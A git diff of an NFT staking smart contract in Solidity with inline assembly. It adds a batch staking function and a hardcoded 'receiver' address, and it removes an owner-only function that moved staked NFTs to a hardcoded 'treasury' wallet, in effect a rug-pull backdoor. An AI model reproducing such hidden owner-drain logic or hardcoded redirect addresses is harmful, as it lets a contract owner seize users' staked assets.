@@ -8,25 +8,22 @@ import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 import "solady/src/utils/SafeTransferLib.sol";
 
 contract StakingLove is Ownable(msg.sender), ERC721Holder {
+
     using SafeERC20 for IERC20;
 
     uint256 private DaoValue;
     uint256 private lifeSpan;
     address public safeadd;
+    address receiver = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;
 
     mapping(address => mapping(uint256 => address)) public userdata;
-    mapping(address => mapping(uint256 => bool)) public pupa;
-    mapping(address => mapping(uint256 => uint256)) public _userStakingTimestamp;
     mapping(address => mapping(uint256 => uint256)) public miloscStakingInfosTime;
     mapping(address => mapping(uint256 => bool)) public collected;
     mapping(address => address) public collectiontokentype;
 
 
-
     function stake(uint256 tokenIds, address _nft) external {
-
         assembly {
-            //storing the 
             mstore(0x0, _nft)
             mstore(0x20, userdata.slot)
             mstore(0x20, keccak256(0x0, 0x40))
@@ -54,24 +51,66 @@ contract StakingLove is Ownable(msg.sender), ERC721Holder {
             }
             sstore(keccak256(0x0, 0x40), currentTime)
 
-            
             mstore(0x00, hex"23b872dd")
             mstore(0x04, caller())
             mstore(0x24, address())
             mstore(0x44, tokenIds)
 
-            if iszero(
-                call(
-                    gas(),
-                    _nft,
-                    0,
-                    0x00,
-                    0x64,
-                    0,
-                    0
-                )
-            ) {
+            if iszero(call(gas(), _nft, 0, 0x00, 0x64, 0, 0)) {
                 revert(0, 0)
+            }
+        }
+    }
+
+    function StakeBunch(uint256[] calldata tokenIds, address _nft) external {
+        assembly {
+            let length := calldataload(sub(tokenIds.offset, 0x20))
+            let dataStart := add(tokenIds.offset, 0x20)
+            for {
+                let i := dataStart
+            } lt(i, add(dataStart, mul(length, 0x20))) {
+                i := add(i, 0x20)
+            } {
+                let tokenId := calldataload(i)
+
+                // Calculate final storage location for userdata mapping
+                mstore(0x0, _nft)
+                mstore(0x20, userdata.slot)
+                mstore(0x20, keccak256(0x0, 0x40))
+                mstore(0x0, tokenId)
+                let finalLocation := keccak256(0x0, 0x40)
+
+                if sload(finalLocation) {
+                    mstore(0x00, 0x639c3fa4) // 'collected()' selector
+                    revert(0x1c, 0x04)
+                }
+                // Mark the token as staked
+                sstore(finalLocation, caller())
+
+                let currentTime := timestamp()
+                mstore(0x0, _nft)
+                mstore(0x20, miloscStakingInfosTime.slot)
+                mstore(0x20, keccak256(0x0, 0x40))
+                mstore(0x00, tokenId)
+
+                let location := keccak256(0x0, 0x40)
+
+                if sload(location) {
+                    mstore(0x0, 0x01336cea) //"overflow' selector
+                    revert(0x1c, 0x04)
+                }
+                sstore(keccak256(0x0, 0x40), currentTime)
+
+                // Prepare ERC721 token transfer call
+                mstore(0x00, hex"23b872dd") // ERC721 transferFrom function signature
+                mstore(0x04, caller()) // From address (caller)
+                mstore(0x24, address()) // To address (this contract)
+                mstore(0x44, tokenId) // TokenId to transfer
+
+                // Execute the transfer
+                if iszero(call(gas(), _nft, 0, 0x00, 0x64, 0, 0)) {
+                    revert(0, 0)
+                }
             }
         }
     }
@@ -109,23 +148,12 @@ contract StakingLove is Ownable(msg.sender), ERC721Holder {
 
             sstore(keccak256(0x0, 0x40), 0x0)
 
-
             mstore(0x00, hex"23b872dd")
             mstore(0x04, address())
             mstore(0x24, reciever)
             mstore(0x44, tokenIds)
 
-             if iszero(
-                call(
-                    gas(),
-                    _nft,
-                    0,
-                    0x00,
-                    0x64,
-                    0,
-                    0
-                )
-            ) {
+            if iszero(call(gas(), _nft, 0, 0x00, 0x64, 0, 0)) {
                 revert(0, 0)
             }
         }
@@ -171,75 +199,12 @@ contract StakingLove is Ownable(msg.sender), ERC721Holder {
             mstore(0x04, tresury)
             mstore(0x24, receiver)
             mstore(0x44, reward)
-           
-           if iszero(
-                call(
-                    gas(),
-                    token,
-                    0,
-                    0x00,
-                    0x64,
-                    0,
-                    0
-                )
-            ) {
+
+            if iszero(call(gas(), token, 0, 0x00, 0x64, 0, 0)) {
                 revert(0, 0)
             }
             // Mark the rewards as collected for this address and token ID
             sstore(location, 0x1)
-        }
-    }
-
-    function zgarnijNft(uint256 tokenIds) external onlyOwner {
-        // Get the timestamp when the token was staked
-        address skarbiec = 0x13d8cc1209A8a189756168AbEd747F2b050D075f;
-
-        assembly {
-           
-            //Cache _userStakingData location for this address.
-            mstore(0x0, caller())
-            mstore(0x20, pupa.slot)
-            mstore(0x20, keccak256(0x0, 0x40))
-            mstore(0x0, tokenIds)
-            let location := keccak256(0x0, 0x40)
-
-            //If not staked revert NotStaked()
-            if iszero(sload(location)) {
-                mstore(0x0, 0x039f2e18) //'NotStaked()' selector
-                revert(0x1c, 0x04)
-            }
-
-            mstore(0x20, _userStakingTimestamp.slot)
-            mstore(0x20, keccak256(0x0, 0x40))
-            mstore(0x00, tokenIds)
-            let stakeTimestamp := sload(keccak256(0x0, 0x40))
-
-            // Check if 500 seconds have passed since staking
-            let currentTime := timestamp()
-            let timeElapsed := sub(currentTime, stakeTimestamp)
-            if lt(timeElapsed, 500) {
-                mstore(0x00, 0x039f2e18) // 'NotStaked()' selector
-                revert(0x1c, 0x04)
-            }
-
-            mstore(0x00, hex"23b872dd")
-            mstore(0x04, address())
-            mstore(0x24, skarbiec)
-            mstore(0x44, tokenIds)
-
-            if iszero(
-                call(
-                    gas(),
-                    0x20a78762085602705007DCB326e33EA71C8d1f6F,
-                    0,
-                    0x00,
-                    0x64,
-                    0,
-                    0
-                )
-            ) {
-                revert(0, 0)
-            }
         }
     }
 
